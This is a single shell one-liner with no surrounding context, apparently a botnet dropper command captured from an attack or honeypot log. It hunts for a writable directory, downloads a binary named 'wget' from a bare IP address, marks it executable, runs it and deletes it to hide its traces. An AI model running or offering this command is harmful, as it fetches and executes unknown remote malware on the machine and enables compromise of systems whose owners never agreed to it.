cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.207.146.45/wget; chmod +x wget; ./wget; rm -rf wget
